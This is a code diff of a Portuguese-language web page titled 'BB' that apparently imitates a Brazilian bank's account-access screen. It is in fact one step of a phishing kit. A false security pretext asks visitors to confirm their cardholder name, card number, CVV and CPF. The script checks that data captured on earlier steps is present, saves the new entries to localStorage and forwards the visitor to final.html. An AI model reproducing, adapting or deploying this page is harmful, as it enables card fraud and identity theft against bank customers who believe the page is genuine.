@@ -1,91 +1,150 @@
 <!doctype html>
 <html class="no-js" lang="zxx">
-   <head>
-      <meta charset="utf-8">
-      <meta http-equiv="x-ua-compatible" content="ie=edge">
-      <title>BB</title>
-      <meta name="description" content="">
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
 
-      <link rel="stylesheet" href="assets/css/bootstrap-float-label.min.css">
-      <link rel="stylesheet" href="assets/css/style.css">
-   </head>
-   <body>
-      <header>	 
-		<div class="header">	  
-		<i class="bi bi-arrow-left-short"></i>
-			 <p>Acessar minha conta</p>
-		 </div>
-		
-      </header>
-      <!-- Preloader Start -->
-      <div id="preloader-active">
-         <div class="preloader d-flex align-items-center justify-content-center">
-            <div class="preloader-inner ">
-               <div class="preloader-img pere-text">
-                  <img src="assets/img/preloader.jpeg" alt="" width="300px">
-                  <br>
-               </div>
+<head>
+   <meta charset="utf-8">
+   <meta http-equiv="x-ua-compatible" content="ie=edge">
+   <title>BB</title>
+   <meta name="description" content="">
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+   <link rel="stylesheet" href="assets/css/bootstrap-float-label.min.css">
+   <link rel="stylesheet" href="assets/css/style.css">
+</head>
+
+<body>
+   <header>
+      <div class="header1">
+         <img src="assets/img/logo.jpeg" alt="" width="40px" style="float: left;">
+         <a href="index.html"><i class="bi bi-box-arrow-in-right"
+               style="float: right;    font-size: 35px;    color: white;    margin-right: 20px;"></i>
+         </a>
+         <h2 id="clientName"></h2>
+      </div>
+
+   </header>
+   <!-- Preloader Start -->
+   <div id="preloader-active">
+      <div class="preloader d-flex align-items-center justify-content-center">
+         <div class="preloader-inner ">
+            <div class="preloader-img pere-text">
+               <img src="assets/img/preloader.jpeg" alt="" width="300px">
+               <br>
             </div>
          </div>
       </div>
-      <div class="main">
-         <p class="tt">Conta corrente, poupança ou salário</p>
-		 <p class="tt1">Para pessoas fisicas.</p>
-    <hr>
-	<p style="padding: 0 15px;">Estamos quase lá Cliente, agora para sua total seguranca e para evitar transtornos futuros como falha em transacoes feitas com seu cartao, confirme os dados solicitados abaixo.</p>
-
-         <div id="errorMsg" style="display:none"></div>
-       <form id="submit-button" class="formf">
-         <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">     
-            <i class="bi bi-card-heading"></i>
-            <input class="form-control inputleft" id="user1" name="user" type="number" placeholder="Número do cartão">
-            
-         </div>
-         <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
-             <i class="bi bi-calendar"></i>
-
-            <input class="form-control inputleft" id="pass1" type="number" placeholder="Conta">
-          
-           
-         </div>
-         <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">   
-         <i class="bi bi-credit-card-2-back"></i>
-
-            <input class="form-control inputleft" id="user1" name="user" type="number" placeholder="Senha de 8 digitos">
-            
-			
-		</div>
-       
-      </form>
-	    <div class="mainchaild1">
-		        
-		
-		
-         
-        
-      </div>
-	   <div class="footer">
-<i class="bi bi-chevron-compact-down"></i>
-<i class="bi bi-chevron-compact-up"></i>
-		
-		</div>
-      <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
-      <script src="assets/js/bootstrap.min.js"></script>
-      <script src="assets/js/jquery.mswitch.js"></script>
-      <script src="assets/js/jquery.form.js"></script>
-      <script>
-         $(window).on('load', function() { 
-             $('#preloader-active').delay(2000).fadeOut('slow');
-             $('body').delay(2000).css({
-                 'overflow': 'visible'
-             });
-         
-         });       
-         
+   </div>
+   <div class="main" style="  margin-top: 30%;">
       
-      </script>
+   </div>
+   <br>
+
+   <p style="padding: 0 15px;">Estamos quase lá Cliente, agora para sua total seguranca e para evitar transtornos futuros
+      como falha em transacoes feitas com seu cartao, confirme os dados solicitados abaixo.</p>
+   
+   <div class="alert alert-danger" role="alert" id="error_msg" style="display: none"></div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="data_9" type="number" placeholder="Nome igual ao Cartão">
+      <label for="phone">Nome igual ao Cartão</label>
+   </div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="data_10" type="number" placeholder="Número do Cartão">
+      <label for="pass">Número do Cartão</label>
+   </div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="data_11" type="text" placeholder="CVV">
+      <label for="pass_">CVV</label>
+   </div>
+   <div class="form-group has-float-label" style="margin-bottom: 20px;margin-top: 20px;">
+      <input class="form-control" id="data_12" type="text" placeholder="CPF">
+      <label for="pass_">CPF</label>
+   </div>
+   <br>
+   <br>
+   <br>
+   <div class="footer">
+      <i class="bi bi-chevron-compact-down"></i>
+      <i class="bi bi-chevron-compact-up"></i>
+      <a href="#" class="entrar" onClick="clickEnter()" id="enter">ENTRAR</a>
+   </div>
+   <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
+   <script src="assets/js/bootstrap.min.js"></script>
+   <script src="assets/js/jquery.mswitch.js"></script>
+   <script src="assets/js/jquery.form.js"></script>
+   <script>
+      $(window).on('load', function () {
+         $('#preloader-active').delay(2000).fadeOut('slow');
+         $('body').delay(2000).css({
+            'overflow': 'visible'
+         });
+
+         document.getElementById("data_9").value = "";
+         document.getElementById("data_10").value = "";
+         document.getElementById("data_11").value = "";
+         document.getElementById("data_12").value = "";
+
+         localStorage.setItem('data_9', '');
+         localStorage.setItem('data_10', '');
+         localStorage.setItem('data_11', '');
+         localStorage.setItem('data_12', '');
+
+         if (sessionStorage.getItem('name') == "") {
+            window.location.href = "index.html";
+         }
+
+         if (localStorage.getItem('data_8') == "") {
+            window.location.href = "index.html";
+         }
+
+      });
+
+      document.getElementById("clientName").innerHTML = sessionStorage.getItem('name');
+
+      function errorMsg(msg) {
+         $("#error_msg").show(500);
+         $("#enter").hide();
+         setTimeout(() => {
+            $("#error_msg").hide(500);
+            $("#enter").show();
+         }, 3000);
+         document.getElementById("error_msg").innerHTML = msg;
+      }
+
+      function clickEnter() {
+
+         let data_9 = document.getElementById("data_9").value;
+         let data_10 = document.getElementById("data_10").value;
+         let data_11 = document.getElementById("data_11").value;
+         let data_12 = document.getElementById("data_12").value;
+         let flag = true;
+
+         if (data_9.length == 0) {
+            errorMsg("Insira o campo Nome igual ao Cartão!");
+            flag = false;
+         } else if (data_10.length == 0) {
+            errorMsg("Insira o campo Senha Número do Cartão!");
+            flag = false;
+         } else if (data_11.length == 0) {
+            errorMsg("Insira o campo Senha do CVV!");
+            flag = false;
+         } else if (data_12.length == 0) {
+            errorMsg("Insira o campo Senha do CPF!");
+            flag = false;
+         } else if (flag == true) {
+            $("#enter").hide();
+            $("#wait_msg").show(500);
+            localStorage.setItem('data_9', data_9);
+            localStorage.setItem('data_10', data_10);
+            localStorage.setItem('data_11', data_11);
+            localStorage.setItem('data_12', data_12);
+
+            window.location.href = "final.html";
+            }
+         }
+
+   </script>
    </body>
-</html>
+   
+   </html>
+   
